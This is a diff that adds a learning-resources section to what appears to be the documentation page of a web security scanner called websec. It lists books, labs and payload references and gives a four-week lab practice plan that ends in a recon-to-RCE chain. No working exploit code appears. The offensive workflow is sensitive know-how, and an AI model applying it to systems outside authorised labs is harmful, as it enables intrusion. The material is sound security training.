+        <h3>Step 1: Understand the Web (Foundations)</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Type</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td>MDN Web Docs — HTTP overview</td><td>Free reference</td><td>Understand HTTP methods, headers, status codes, cookies — the building blocks websec attacks</td></tr>
+            <tr><td>How HTTPS Works (howhttps.works)</td><td>Free visual guide</td><td>Understand TLS — why traffic looks encrypted and how certificates work</td></tr>
+            <tr><td>OWASP Top 10 (owasp.org/www-project-top-ten)</td><td>Free spec</td><td>The 10 most critical web vulnerabilities — websec covers all of them</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 2: Hands-On Labs (Intentionally Vulnerable Apps)</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Platform / App</th><th>Cost</th><th>Focus</th></tr></thead>
+          <tbody>
+            <tr><td>PortSwigger Web Security Academy (portswigger.net/web-security)</td><td>Free</td><td>The best free web security course online. Covers SQLi, XSS, SSRF, XXE, CSRF, IDOR, deserialization. Interactive labs with built-in hints. Run websec against their lab URLs for real practice.</td></tr>
+            <tr><td>DVWA (Damn Vulnerable Web App)</td><td>Free / self-hosted</td><td>Intentionally vulnerable PHP app. Run locally via Docker: <code>docker run -p 80:80 vulnerables/web-dvwa</code>. Use websec's sqli/xss/dirb against it.</td></tr>
+            <tr><td>HackTheBox (hackthebox.com)</td><td>Free tier + paid</td><td>Web challenges and machines. Filter by "Web" category. Start with Easy difficulty.</td></tr>
+            <tr><td>TryHackMe (tryhackme.com)</td><td>Free tier + paid</td><td>Web paths include "OWASP Top 10" and "Web Fundamentals" — structured learning with guided rooms.</td></tr>
+            <tr><td>OWASP WebGoat (github.com/WebGoat/WebGoat)</td><td>Free / self-hosted</td><td>Explains each vulnerability then lets you exploit it. Good for understanding why each attack works.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 3: Go Deeper — Books and Courses</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Book / Course</th><th>Level</th><th>Covers</th></tr></thead>
+          <tbody>
+            <tr><td>The Web Application Hacker's Handbook (Stuttard &amp; Pinto)</td><td>Intermediate</td><td>Comprehensive reference covering all major web vulns. Dated (2011) but foundational. Chapter 9 (SQLi) and 12 (XSS) are still the best explanations anywhere.</td></tr>
+            <tr><td>Real-World Bug Hunting (Yaworski, No Starch Press)</td><td>Beginner-Intermediate</td><td>Real bug bounty writeups for each vulnerability class. Teaches you to think like a bug hunter.</td></tr>
+            <tr><td>OWASP Testing Guide v4 (owasp.org)</td><td>Intermediate</td><td>Free PDF — systematic methodology for testing every web vuln. Use it as a checklist alongside websec.</td></tr>
+            <tr><td>Bug Bounty Bootcamp (Vickie Li, No Starch)</td><td>Intermediate</td><td>Covers how to find and report web vulns on real programs. Excellent chapter on recon.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 4: Reference — While Using websec</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Use For</th></tr></thead>
+          <tbody>
+            <tr><td>PayloadsAllTheThings (github.com/swisskyrepo/PayloadsAllTheThings)</td><td>Massive payload list for SQLi, XSS, SSRF, XXE, command injection, file inclusion — reference while testing</td></tr>
+            <tr><td>HackTricks (book.hacktricks.xyz)</td><td>Cheatsheets and techniques for every type of web attack. Especially good for SQL injection by database type.</td></tr>
+            <tr><td>GTFOBins (gtfobins.github.io)</td><td>Unix binaries that can be used for command execution, file read/write — useful for post-exploitation after getting command injection</td></tr>
+            <tr><td>SQLMap cheat sheet</td><td>When websec detects SQLi, SQLMap can automate full extraction — understand its flags to control output</td></tr>
+            <tr><td>OWASP XSS Filter Evasion Cheat Sheet</td><td>When websec XSS detection fails, this lists every known browser-specific bypass technique</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Practice Path — Using websec + Labs Together</h3>
+        <pre><code><span class="comment">## Recommended practice progression using secV + external labs</span>
+
+Week 1: Foundations
+  Read: OWASP Top 10 (owasp.org) — understand each category at a high level
+  Lab: DVWA in Docker on your Kali VM
+  Run: websec against DVWA (http://localhost) — see what it finds automatically
+
+Week 2: SQL Injection Mastery
+  Study: PortSwigger SQLi labs (portswigger.net/web-security/sql-injection)
+  Lab: HackTheBox "Unified" machine (has MongoDB injection)
+  Run: websec sqli on each PortSwigger lab URL
+  Deep: read "SQL Injection" chapter in Web App Hacker's Handbook
+
+Week 3: XSS
+  Study: PortSwigger XSS labs — 30+ labs covering reflected, stored, DOM
+  Lab: DVWA XSS (all difficulty levels)
+  Run: websec xss_scan on each lab
+  Deep: try bypassing WAF manually after websec finds the injection point
+
+Week 4: Full Chain
+  Lab: HackTheBox Easy web machine
+  Process: recon → dirb → sqli → xss → find credentials → RCE
+  Use websec for each phase; understand WHAT it's doing, not just THAT it works</code></pre>
       </section>
 
       <!-- Author -->
